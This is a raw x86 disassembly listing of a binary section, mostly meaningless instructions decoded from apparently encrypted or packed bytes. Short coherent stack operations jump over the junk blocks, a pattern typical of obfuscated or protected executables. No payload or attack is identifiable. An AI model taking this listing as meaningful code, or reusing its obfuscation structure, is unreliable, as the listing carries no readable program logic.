  40210a:	in     eax,0xec
  40210c:	or     BYTE PTR [edi+0x79338233],ah
  402112:	das    
  402113:	cmp    al,0x16
  402115:	inc    ecx
  402116:	jl     0x402182
  402118:	neg    DWORD PTR [ebx-0x3bd6a4f1]
  40211e:	fsub   DWORD PTR [esi]
  402120:	in     al,0x79
  402122:	cdq    
  402123:	xchg   ebp,eax
  402124:	ror    esp,1
  402126:	and    bl,ch
  402128:	aad    0x2
  40212a:	outs   dx,DWORD PTR ds:[esi]
  40212b:	je     0x402174
  40212d:	mov    esp,0x6cad5330
  402132:	fwait
  402133:	int3   
  402134:	iret   
  402135:	inc    esp
  402136:	push   esi
  402137:	aaa    
  402138:	dec    ecx
  402139:	call   0xaa1f5c7b
  40213e:	mov    DWORD PTR [esi+0x2938cead],esi
  402144:	je     0x402110
  402146:	cwde   
  402147:	leave  
  402148:	retf   0xf474
  40214b:	push   ebp
  40214c:	mov    esi,0x8b50c47a
  402151:	inc    ebp
  402152:	call   0x40cb5c
  402157:	add    cl,ch
  402159:	pushf  
  40215a:	add    DWORD PTR [eax],eax
  40215c:	add    ch,dh
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	push   esp
  40216a:	mov    esp,0x21e02e3
  40216f:	jle    0x4021ef
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x40212d
  402176:	bound  edx,QWORD PTR [esp+edi*1+0x74]
  40217a:	and    DWORD PTR [edi+esi*2],ebx
  40217d:	push   cs
  40217e:	nop
  40217f:	adc    edi,DWORD PTR [ebx]
  402181:	stc    
  402182:	imul   edx,DWORD PTR [esi+edx*8+0x7ce863f8],0xffffffc6
  40218a:	cmp    edx,DWORD PTR [ebp-0x6fae6951]
  402190:	add    DWORD PTR [ebx+0x27],esi
  402193:	lock xor eax,0xe2a87411
  402199:	enter  0xab00,0x36
  40219d:	fiadd  DWORD PTR [ecx-0x1c]
  4021a0:	pop    eax
  4021a1:	test   BYTE PTR [edi],ah
  4021a3:	mov    al,bl
  4021a5:	push   es
  4021a6:	xor    cl,bh
  4021a8:	push   ecx
  4021a9:	rol    BYTE PTR [esi-0x2b05fc9],0xb7
  4021b0:	mov    BYTE PTR [ecx+0x68c8d487],al
  4021b6:	mov    ds:0x94a02e1b,al
  4021bb:	xchg   edi,eax
  4021bc:	jg     0x4021f0
  4021be:	xor    BYTE PTR [edi-0x3c30215f],dh
  4021c4:	fstp   QWORD PTR [ecx-0x13f916c1]
  4021ca:	dec    edi
  4021cb:	lea    ecx,[edi-0x16]
  4021ce:	mov    ss,WORD PTR [edx-0x3ae52aec]
  4021d4:	sub    eax,0xeba24303
  4021d9:	clc    
  4021da:	xor    BYTE PTR [ebp-0x16f6896c],bl
  4021e0:	dec    ecx
  4021e1:	call   0x885f:0x37717483
  4021e8:	mov    ah,0xb
  4021ea:	inc    eax
  4021eb:	aaa    
  4021ec:	popf   
  4021ed:	jo     0x402205
  4021ef:	mov    bl,0x58
  4021f1:	pop    edi
  4021f2:	(bad)  
  4021f3:	pop    ebp
  4021f4:	pop    edx
  4021f5:	mov    cl,0x61
  4021f7:	adc    edx,ebx
  4021f9:	dec    ebp
  4021fa:	xchg   ecx,eax
  4021fb:	in     eax,dx
  4021fc:	lahf   
  4021fd:	sbb    esp,edx
  4021ff:	addr16 push ss
  402201:	dec    eax
  402202:	mov    ds:0x3493f1ba,eax
  402207:	jecxz  0x4021e7
  402209:	out    0x72,al
  40220b:	mov    ecx,0xe4237e34
  402210:	or     ch,BYTE PTR [edx]
  402212:	std    
  402213:	mov    ebp,0x5d9313b
  402218:	mov    ds:0x7b1486dd,al
  40221d:	syscall 
  40221f:	push   ds
  402220:	cmp    ebp,ebx
  402222:	pop    esp
  402223:	int    0xf
  402225:	adc    al,0x3
  402227:	jmp    0x40224c
  402229:	pop    es
  40222a:	pop    ds
  40222b:	outs   dx,DWORD PTR ds:[esi]
  40222c:	test   ah,ah
  40222e:	mov    ebx,DWORD PTR [ecx-0x6]
  402231:	xchg   ebx,eax
  402232:	xor    BYTE PTR [esi],dl
  402234:	mov    ss,WORD PTR [edx+0x1a]
  402237:	cmc    
  402238:	jle    0x4021f4
  40223a:	iret   
  40223b:	jmp    0x5fe8:0x83465c73
  402242:	aas    
  402243:	mov    cl,0x6b
  402245:	and    BYTE PTR [edx],dl
  402247:	(bad)  
  402248:	cmp    al,0x3f
  40224a:	push   ebx
  40224b:	ins    BYTE PTR es:[edi],dx
  40224c:	jmp    0x402282
  40224e:	xor    BYTE PTR [eax+eiz*8],bh
  402251:	and    ebp,DWORD PTR [eax-0x714dc787]
  402257:	cmp    BYTE PTR [eax-0x4bfed104],bh
  40225d:	pop    ecx
  40225e:	fstp   TBYTE PTR [edi+0x7d]
  402261:	sub    ah,BYTE PTR ds:0x5881e6b5
  402267:	add    al,0x45
  402269:	mov    ds:0x69b8a902,eax
  40226e:	push   es
  40226f:	push   0x280f5033
  402274:	xor    ah,BYTE PTR [edi-0x37]
  402277:	pop    es
  402278:	xchg   edi,eax
  402279:	loop   0x40220e
  40227b:	rol    BYTE PTR [eax],cl
  40227d:	dec    ebp
  40227e:	(bad)  
  40227f:	push   ebx
  402280:	xor    al,0xaa
  402282:	dec    esp
  402283:	pop    ds
  402284:	cmp    dl,cl
  402286:	add    eax,0x3a054101
  40228b:	push   edx
  40228c:	fst    DWORD PTR [eax+0x52]
  40228f:	(bad)  
  402290:	repz inc ebx
  402292:	arpl   WORD PTR [ebp+0x8],sp
  402295:	inc    eax
  402296:	(bad)
  402299:	ss push esp
  40229b:	repnz sahf 
  40229d:	push   es
  40229e:	sbb    edx,DWORD PTR [eax]
  4022a0:	xchg   bl,bl
  4022a2:	repnz cmp BYTE PTR [edi],dh
  4022a5:	jbe    0x402232
  4022a7:	jnp    0x4022dd
  4022a9:	repnz retf 
  4022ab:	add    DWORD PTR [edi],ebp
  4022ad:	jno    0x40224e
  4022af:	shl    DWORD PTR [eax],cl
  4022b1:	jo     0x40232c
  4022b3:	ins    DWORD PTR es:[edi],dx
  4022b4:	not    BYTE PTR [eax+0x17]
  4022b7:	inc    edx
  4022b8:	(bad)  
  4022b9:	xchg   edx,eax
  4022ba:	repz jge 0x4022a8
  4022bd:	pop    edi
  4022be:	pop    ebx
  4022bf:	(bad)  
  4022c0:	jl     0x40229d
  4022c2:	cmp    bh,BYTE PTR [edi+0x46]
  4022c5:	push   ebx
  4022c6:	imul   eax,DWORD PTR [ebx+0x6fc2638d],0xffffffaf
  4022cd:	out    dx,al
  4022ce:	push   0x2e
  4022d0:	addr16 mov ebx,0x3807c6fb
  4022d6:	sbb    BYTE PTR [ebx+0xa],cl
  4022d9:	inc    esp
  4022da:	adc    DWORD PTR [ebp+0x241ef065],edx
  4022e0:	sub    edi,ecx
  4022e2:	adc    BYTE PTR [edi+0x78],dh
  4022e5:	jl     0x4022c0
  4022e7:	in     eax,dx
  4022e8:	cmc    
  4022e9:	lock adc al,0x98
  4022ec:	arpl   WORD PTR [ebp+0x9bcd4c2],sp
  4022f2:	jge    0x4022d7
  4022f4:	outs   dx,DWORD PTR ds:[esi]
  4022f5:	and    DWORD PTR [edx],esi
  4022f7:	jge    0x402367
  4022f9:	push   eax
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	lods   eax,DWORD PTR ds:[esi]
  402358:	mov    bl,0xf2
  40235a:	das    
  40235b:	call   0x7e7f:0xfa7e7e03
  402362:	jle    0x402352
  402364:	retf   0x9a60
  402367:	mov    eax,cs:0x62c4de53
  40236d:	es jg  0x4023b5
  402370:	jb     0x402349
  402372:	adc    al,0xe0
  402374:	xlat   BYTE PTR ds:[ebx]
  402375:	push   esp
  402376:	jl     0x4023bb
  402378:	out    0x27,al
  40237a:	fs dec esp
  40237c:	pop    edi
  40237d:	lahf   
  40237e:	inc    edx
  40237f:	out    dx,eax
  402380:	pop    ebx
  402381:	push   cs
  402382:	ins    BYTE PTR es:[edi],dx
  402383:	das    
  402384:	ficomp WORD PTR [eax-0x22]
  402387:	scas   eax,DWORD PTR es:[edi]
  402388:	mov    ecx,0x492afb8f
  40238d:	jmp    0x3f63bfe6
  402392:	ss mov cl,0x82
  402395:	sub    ecx,eax
  402397:	loopne 0x402364
  402399:	ret    0x42ac
  40239c:	dec    ebx
  40239d:	lods   eax,DWORD PTR ds:[esi]
  40239e:	push   eax
  40239f:	ret    
  4023a0:	popf   
  4023a1:	add    ecx,ebp
  4023a3:	cwde   
  4023a4:	leave  
  4023a5:	jbe    0x402386
  4023a7:	dec    eax
  4023a8:	shl    DWORD PTR [eax-0x5f984c8c],cl
  4023ae:	lahf   
  4023af:	mov    cs,WORD PTR [ebx-0x5a]
  4023b2:	lods   al,BYTE PTR ds:[esi]
  4023b3:	cli    
  4023b4:	jns    0x402391
  4023b6:	xlat   BYTE PTR ds:[ebx]
  4023b7:	scas   eax,DWORD PTR es:[edi]
  4023b8:	inc    ebp
  4023b9:	inc    edi
  4023ba:	sub    eax,0x4d254a78
  4023bf:	(bad)  
  4023c0:	loopne 0x402382
  4023c2:	pop    ebx
  4023c3:	loop   0x402389
  4023c5:	jns    0x4023f4
  4023c7:	add    esi,DWORD PTR [esp+edx*8+0x68]
  4023cb:	stc    
  4023cc:	fs add al,0x67
  4023cf:	test   edx,edi
  4023d1:	xchg   ecx,eax
  4023d2:	imul   esp,ebp,0xc2e3267b
  4023d8:	jo     0x4023e1
  4023da:	fstp   QWORD PTR [eax+0x1bc00f9]
  4023e0:	fwait
  4023e1:	(bad)  
  4023e2:	fstp   QWORD PTR [eax]
  4023e4:	sbb    DWORD PTR [eax],ebx
  4023e6:	jecxz  0x402421
  4023e8:	push   ebp
  4023e9:	pop    edx
  4023ea:	(bad)  
  4023ec:	mov    dl,0xc7
  4023ee:	xor    BYTE PTR [ecx-0x12],cl
  4023f1:	jg     0x40237b
  4023f3:	loope  0x40244d
  4023f5:	div    DWORD PTR [edi-0x3bbef8e7]
  4023fb:	adc    BYTE PTR [ecx+0x58],0x30
  4023ff:	jne    0x4023ed
  402401:	into   
  402402:	mov    al,ds:0x781975a
  402407:	mov    al,ds:0x554b6123
  40240c:	pop    ebp
  40240d:	dec    esp
  40240e:	mov    ds:0x1c1e0143,al
  402413:	push   es
  402414:	mov    ebx,0x160659e0
  402419:	ficomp WORD PTR [esi+edx*2+0x4e]
  40241d:	mov    al,0x14
  40241f:	xor    DWORD PTR [esi+0x7914ab07],0xd185ccc
  402429:	ins    BYTE PTR es:[edi],dx
  40242a:	mov    al,ds:0x33d0bda2
  40242f:	imul   ecx,ebx,0x1d
  402432:	loopne 0x402425
  402434:	push   cs
  402435:	not    ecx
  402437:	and    cl,bh
  402439:	mov    DWORD PTR [edx+edi*2-0x1a],ebx
  40243d:	retf   
  40243e:	ds jl  0x4023ef
  402441:	fdivr  QWORD PTR [edi+ecx*1]
  402444:	pop    edx
  402445:	mov    ebp,0x93700022
  40244a:	test   eax,0xa2e7cf74
  40244f:	sbb    al,0xaf
  402451:	mov    ch,0x4
  402453:	int3   
  402454:	xor    edi,DWORD PTR [esi+0x2e9d210e]
  40245a:	push   eax
  40245b:	mov    ch,0x29
  40245d:	dec    bl
  40245f:	aam    0x2e
  402461:	retf   0x8a14
  402464:	mov    dl,0x9f
  402466:	test   BYTE PTR [esi-0x545e1afd],ah
  40246c:	inc    ebx
  40246d:	cmc    
  40246e:	aas    
  40246f:	inc    ebx
  402470:	cli    
  402471:	bound  ecx,QWORD PTR [ecx-0xa]
  402474:	mov    dl,0x76
  402476:	mov    DWORD PTR [ecx+0x678eb790],esi
  40247c:	xor    ebx,DWORD PTR [ecx-0x124e9958]
  402482:	mov    cl,0x17
  402484:	shr    DWORD PTR [eax-0x1e],cl
  402487:	push   esi
  402488:	and    DWORD PTR [edx+0x12],ebx
  40248b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40248c:	lahf   
  40248d:	repz popf 
  40248f:	lods   al,BYTE PTR ds:[esi]
  402490:	stc    
  402491:	ret    
  402492:	lods   eax,DWORD PTR ds:[esi]
  402493:	and    DWORD PTR [ecx],ebx
  402495:	cmp    esi,DWORD PTR [esp+ebx*1]
  402498:	dec    esi
  402499:	rol    BYTE PTR [eax-0x3fd09adf],cl
  40249f:	idiv   esi
  4024a1:	bound  esi,QWORD PTR [esi+esi*8]
  4024a4:	in     al,0xe7
  4024a6:	mov    ecx,0xee536e7c
  4024ab:	in     al,0x2b
  4024ad:	xchg   esp,eax
  4024ae:	mov    DWORD PTR [edx],esp
  4024b0:	xchg   ecx,eax
  4024b1:	jge    0x4024cb
  4024b3:	push   esi
  4024b4:	test   al,0x31
  4024b6:	xchg   ah,al
  4024b8:	repz sub al,0xee
  4024bb:	adc    dl,bl
  4024bd:	xchg   ebx,eax
  4024be:	(bad)  
  4024bf:	adc    al,0x71
  4024c1:	hlt    
  4024c2:	xchg   esp,eax
  4024c3:	add    esi,DWORD PTR [ebp-0x645c371b]
  4024c9:	adc    eax,0x60be7695
  4024ce:	xchg   esi,eax
  4024cf:	popa   
  4024d0:	pop    ds
  4024d1:	mov    esi,0x2f7a1f8a
  4024d6:	inc    eax
  4024d7:	lods   eax,DWORD PTR ds:[esi]
  4024d8:	rol    DWORD PTR [esi-0x257ae82],1
  4024de:	(bad)  
  4024df:	fild   DWORD PTR ds:0x7bbb3b1a
  4024e5:	scas   al,BYTE PTR es:[edi]
  4024e6:	add    DWORD PTR [ebx+0x4589f045],ecx
  4024ec:	lock mov eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	xacquire xchg DWORD PTR [ebp+0x7e01260d],ecx
  402514:	jle    0x402510
  402516:	jg     0x402596
  402518:	jle    0x40252e
  40251a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40251b:	and    al,0xa6
  40251d:	into   
  40251e:	outs   dx,DWORD PTR ds:[esi]
  40251f:	mov    ecx,DWORD PTR [edx]
  402521:	hlt    
  402522:	xchg   DWORD PTR [esi],ecx
  402524:	out    0x8,al
  402526:	dec    ecx
  402527:	dec    edi
  402528:	jmp    0x77a30cd0
  40252d:	enter  0x2ba9,0xb2
  402531:	lods   al,BYTE PTR ds:[esi]
  402532:	in     eax,dx
  402533:	aas    
  402534:	sahf   
  402535:	mov    dh,0xb0
  402537:	and    DWORD PTR [edx],eax
  402539:	cld    
  40253a:	xchg   esi,eax
  40253b:	jb     0x402502
  40253d:	inc    eax
  40253e:	cld    
  40253f:	mov    ds:0x74d55476,eax
  402544:	push   ecx
  402545:	add    DWORD PTR [ebx+0xf],ecx
  402548:	fcom   QWORD PTR [eax]
  40254a:	arpl   WORD PTR [eax+ebx*8],si
  40254d:	push   es
  40254e:	test   DWORD PTR [edi-0x7f],0x7b66a878
  402555:	ret    
  402556:	pop    esi
  402557:	stos   BYTE PTR es:[edi],al
  402558:	add    eax,0xbb22bf70
  40255d:	xchg   edi,eax
  40255e:	mov    bh,0xdf
  402560:	and    BYTE PTR [edx],al
  402562:	sub    eax,0xfa302bff
  402567:	rcr    BYTE PTR [ebp+0x1c],1
  40256a:	pop    ebp
  40256b:	sub    eax,0xefd7dcbb
  402570:	mov    ds:0xf30ce7ca,eax
  402575:	mov    eax,ebp
  402577:	xlat   BYTE PTR fs:[ebx]
  402579:	in     al,dx
  40257a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40257b:	fcom   QWORD PTR [eax+0x6a1b4382]
  402581:	adc    al,0x4b
  402583:	cmc    
  402584:	shl    DWORD PTR [eax-0x1a],1
  402587:	ret    0x3cec
  40258a:	jecxz  0x402510
  40258c:	xchg   DWORD PTR [esi+0xc],ebp
  40258f:	shl    DWORD PTR [edi],0xe2
  402592:	pop    es
  402593:	sar    esp,0xd2
  402596:	arpl   WORD PTR ds:0xcff51a77,bp
  40259c:	jl     0x40254a
  40259e:	sbb    esp,DWORD PTR [esi-0x6793087]
  4025a4:	pop    ecx
  4025a5:	rol    DWORD PTR [edi],cl
  4025a7:	popa   
  4025a8:	retf   0xde36
  4025ab:	arpl   WORD PTR [ebx],bp
  4025ad:	in     eax,dx
  4025ae:	add    al,0x34
  4025b0:	mov    cl,0x3a
  4025b2:	(bad)
  4025b6:	mov    al,ds:0xf8030901
  4025bb:	cmp    ah,BYTE PTR [ecx-0x72b450d9]
  4025c1:	test   BYTE PTR [esi],bl
  4025c3:	data16 jns 0x40259a
  4025c6:	sbb    DWORD PTR [edx],edi
  4025c8:	imul   ebp,esi,0xfffffff2
  4025cb:	and    ch,bl
  4025cd:	repnz aad 0x5c
  4025d0:	test   DWORD PTR [eax+ecx*4-0x8d8853d],ebp
  4025d7:	sub    DWORD PTR [edi-0x3d5a571f],0xffffffa0
  4025de:	xchg   ebx,eax
  4025df:	cld    
  4025e0:	outs   dx,BYTE PTR ds:[esi]
  4025e1:	jns    0x402656
  4025e3:	jno    0x4025d9
  4025e5:	push   0x41d406ef
  4025ea:	imul   edi,DWORD PTR [ecx],0xbb717744
  4025f0:	cdq    
  4025f1:	xchg   ecx,eax
  4025f2:	scas   al,BYTE PTR es:[edi]
  4025f3:	loopne 0x402604
  4025f5:	bound  esi,QWORD PTR [ecx+0x6d2c182b]
  4025fb:	jno    0x40259f
  4025fd:	test   BYTE PTR [ebp+0x612d0363],bl
  402603:	xchg   DWORD PTR [edi-0x75],edi
  402606:	out    0x10,al
  402608:	fidiv  DWORD PTR [edx]
  40260a:	outs   dx,DWORD PTR ds:[esi]
  40260b:	pop    ds
  40260c:	shr    DWORD PTR [edx-0x22943c61],cl
  402612:	cs call 0x2659:0x6f00fac3
  40261a:	push   es
  40261b:	lds    ebp,FWORD PTR [edi+0x47]
  40261e:	jmp    0x42d06b4f
  402623:	ins    BYTE PTR es:[edi],dx
  402624:	outs   dx,DWORD PTR ds:[esi]
  402625:	es and al,0x7b
  402628:	fst    DWORD PTR [eax-0x79]
  40262b:	(bad)  
  40262c:	and    eax,0xaaf7882
  402631:	in     eax,0x6e
  402633:	sbb    esp,DWORD PTR [ebx]
  402635:	or     al,0xc2
  402637:	shl    BYTE PTR [esi],cl
  402639:	stos   BYTE PTR es:[edi],al
  40263a:	int    0xaf
  40263c:	fild   WORD PTR [eax]
  40263e:	in     ax,dx
  402640:	pop    edx
  402641:	inc    esi
  402642:	mov    ds:0x1e229a1a,al
  402647:	dec    edx
  402648:	jg     0x4026aa
  40264a:	push   ebp
  40264b:	lea    edi,[edx+edi*2-0x60]
  40264f:	and    al,0x6e
  402651:	cmp    al,0xa7
  402653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402654:	xchg   ebx,eax
  402655:	xchg   DWORD PTR [edi],eax
  402657:	xor    eax,0x73c19b62
  40265c:	xchg   ebp,eax
  40265d:	xor    eax,0xdfef3588
  402662:	arpl   bx,ax
  402664:	jmp    DWORD PTR [edx-0x611cb2a9]
  40266a:	ja     0x402679
  40266c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40266d:	cmp    eax,0x62b99608
  402672:	cli    
  402673:	mov    ebp,0xdc3e1565
  402678:	mov    edi,DWORD PTR [eax+0x26bdec41]
  40267e:	cmp    ch,0xc8
  402681:	mov    ebx,0x7b82a432
  402686:	scas   al,BYTE PTR es:[edi]
  402687:	in     eax,0x8f
  402689:	leave  
  40268a:	imul   edi,edi,0x53
  40268d:	iret   
  40268e:	or     eax,0x7d1262af
  402693:	jmp    0x4e64:0x2df39b8d
  40269a:	push   ss
  40269b:	xchg   ebp,eax
  40269c:	je     0x4026d1
  40269e:	mov    BYTE PTR ds:0x32729b,0x89
  4026a5:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  4026ab:	clc    
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	daa    
  4026d3:	mov    al,BYTE PTR [ebp+eax*8+0x7e7e0ea2]
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x40266b
  4026df:	ror    DWORD PTR [ecx],0x17
  4026e2:	xchg   ebx,eax
  4026e3:	cmp    DWORD PTR [edx-0x17c8339],ecx
  4026e9:	(bad)  
  4026ea:	xchg   ebp,eax
  4026eb:	leave  
  4026ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026ed:	mov    edi,ebx
  4026ef:	and    DWORD PTR [ebp+0x60],ecx
  4026f2:	imul   esp,esi,0x3f
  4026f5:	sub    BYTE PTR [edi],0x34
  4026f8:	je     0x402694
  4026fa:	in     eax,dx
  4026fb:	mov    cl,0xa0
  4026fd:	and    DWORD PTR [edx-0x32f1a5ec],edx
  402703:	dec    ebp
  402704:	mov    DWORD PTR [ebx],ecx
  402706:	clc    
  402707:	xchg   esp,eax
  402708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402709:	jmp    0x402783
  40270b:	sub    BYTE PTR [edi-0x5c],0x33
  40270f:	in     al,0xe6
  402711:	loopne 0x402731
  402713:	cmp    DWORD PTR [ebx],edx
  402715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402716:	push   edi
  402717:	jnp    0x402742
  402719:	ror    BYTE PTR [ebx+0x5dc8a580],cl
  40271f:	sbb    eax,0xef7572a2
  402724:	imul   ebx,DWORD PTR [edx],0x72
  402727:	ret    0x6d5
  40272a:	in     eax,0x1
  40272c:	out    dx,eax
  40272d:	mov    edx,0x334868a6
  402732:	shl    DWORD PTR [ebx+0xf],cl
  402735:	push   0x1d252fde
  40273a:	pop    ebp
  40273b:	ficomp WORD PTR [esi+0x74]
  40273e:	jmp    0xa3dc68cb
  402743:	mov    edi,0x6a059b4
  402748:	ror    BYTE PTR [ebp-0x48],1
  40274b:	dec    esi
  40274c:	ja     0x4026dc
  40274e:	jae    0x4026e3
  402750:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402751:	js     0x4027ba
  402753:	in     eax,0xcb
  402755:	jbe    0x4027cc
  402757:	push   0xffffff9f
  402759:	cmp    bl,dl
  40275b:	add    eax,0x16cd80ed
  402760:	call   0xdd1c:0x4d41b55a
  402767:	jg     0x402731
  402769:	lea    edi,ds:0x2bd8cfd6
  40276f:	stos   DWORD PTR es:[edi],eax
  402770:	adc    BYTE PTR [ebx],0x7f
  402773:	mov    eax,ds:0x527e0636
  402778:	scas   al,BYTE PTR es:[edi]
  402779:	addr16 mov al,0x73
  40277c:	push   ebp
  40277d:	push   ebp
  40277e:	jbe    0x402761
  402780:	push   eax
  402781:	inc    eax
  402782:	fcmovne st,st(0)
  402784:	push   ss
  402785:	(bad)  
  402786:	inc    esi
  402787:	adc    dl,BYTE PTR [edi-0x7]
  40278a:	adc    bl,BYTE PTR [ecx]
  40278c:	sbb    eax,DWORD PTR [eax]
  40278e:	push   edi
  40278f:	pop    edi
  402790:	xor    DWORD PTR [edx+0x14],eax
  402793:	es dec ebx
  402795:	xor    dl,BYTE PTR [esi+esi*4]
  402798:	shr    DWORD PTR ss:[eax+0x1112c4c3],cl
  40279f:	mov    edx,0x17ccc87a
  4027a4:	fdiv   QWORD PTR ds:0x8d2b20a9
  4027aa:	add    eax,0x116584e1
  4027af:	xlat   BYTE PTR ds:[ebx]
  4027b0:	add    ecx,ecx
  4027b2:	pop    eax
  4027b3:	gs stos DWORD PTR es:[edi],eax
  4027b5:	inc    ebx
  4027b6:	jbe    0x402815
  4027b8:	(bad)  
  4027b9:	aaa    
  4027ba:	pop    eax
  4027bb:	out    dx,al
  4027bc:	sub    BYTE PTR ds:0xd2eec78f,cl
  4027c2:	sub    eax,DWORD PTR [ebx+0x64]
  4027c5:	stc    
  4027c6:	mov    ss,WORD PTR [edx-0x2a]
  4027c9:	sbb    DWORD PTR [edx],esi
  4027cb:	jge    0x40276d
  4027cd:	imul   di,WORD PTR [edi-0x55],0xdc50
  4027d3:	hlt    
  4027d4:	inc    ebp
  4027d5:	repnz sbb DWORD PTR [eax],0x5
  4027d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027da:	mov    bl,0x28
  4027dc:	jp     0x4027ec
  4027de:	rol    BYTE PTR [edi+esi*2],0xed
  4027e2:	mov    bl,0x5
  4027e4:	scas   eax,DWORD PTR es:[edi]
  4027e5:	fist   WORD PTR [esi-0xcfaa913]
  4027eb:	jecxz  0x402803
  4027ed:	popa   
  4027ee:	dec    ebx
  4027ef:	ficomp DWORD PTR fs:[ebx+esi*2-0x38e7d183]
  4027f7:	icebp  
  4027f8:	sar    DWORD PTR [ecx],1
  4027fa:	bound  ecx,QWORD PTR [esi+0x22]
  4027fd:	cmp    BYTE PTR [ecx+ebp*4+0x60],bh
  402801:	mov    ebx,0x81a4e9e9
  402806:	xchg   ebx,eax
  402807:	pop    esi
  402808:	dec    ebp
  402809:	jp     0x402847
  40280b:	pop    ebp
  40280c:	add    cl,BYTE PTR [edi-0x1c232b47]
  402812:	clc    
  402813:	pop    ebp
  402814:	push   ds
  402815:	cs sub eax,0xc9751672
  40281b:	jb     0x402822
  40281d:	dec    ecx
  40281e:	jns    0x402887
  402820:	mov    dh,BYTE PTR [edx]
  402822:	xchg   edx,eax
  402823:	mov    ah,0x3c
  402825:	cmp    DWORD PTR [ebp+0x6dd5a24f],ebp
  40282b:	icebp  
  40282c:	mov    edi,0x48c8e1ec
  402831:	sbb    edx,DWORD PTR [ecx+0x18]
  402834:	jle    0x402828
  402836:	pop    esp
  402837:	add    eax,0xabcc8451
  40283c:	ins    DWORD PTR es:[edi],dx
  40283d:	lds    edi,FWORD PTR [ecx]
  40283f:	jg     0x4028ae
  402841:	dec    esp
  402842:	mov    eax,ds:0xb71a55b3
  402847:	jbe    0x402808
  402849:	pop    ebx
  40284a:	push   0xffffffd1
  40284c:	je     0x40283c
  40284e:	mov    ebp,0x401dfc7a
  402853:	pop    ecx
  402854:	test   DWORD PTR [esi+0xe5ca440],eax
  40285a:	mov    ds:0x295dedab,eax
  40285f:	repz push eax
  402861:	ror    BYTE PTR [ebx+0x4d8bd045],0xf8
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	sar    al,0x8c
  402886:	int    0x2e
  402888:	or     al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x4028cf
  402890:	into   
  402891:	jecxz  0x402846
  402893:	fimul  WORD PTR [ebx+0x2f]
  402896:	sbb    BYTE PTR [esi+0x5805c35d],dh
  40289c:	mov    DWORD PTR [ecx+eiz*8+0x67170f9e],eax
  4028a3:	aam    0x24
  4028a5:	loopne 0x40289e
  4028a7:	mov    eax,0x343b38b3
  4028ac:	adc    bh,bh
  4028ae:	daa    
  4028af:	imul   esp,DWORD PTR [edx],0xffffffaa
  4028b2:	shl    eax,0xb6
  4028b5:	aas    
  4028b6:	aaa    
  4028b7:	pushf  
  4028b8:	or     al,cl
  4028ba:	xchg   ecx,eax
  4028bb:	in     eax,0x9a
  4028bd:	cmp    ecx,0x2d
  4028c0:	frstor ds:0x543b51df
  4028c6:	ret    0x6467
  4028c9:	dec    esp
  4028ca:	add    bl,BYTE PTR [eax-0x6db2194a]
  4028d0:	das    
  4028d1:	dec    esi
  4028d2:	sar    DWORD PTR [esp+ebp*8],1
  4028d5:	add    BYTE PTR [eax+0x79],bh
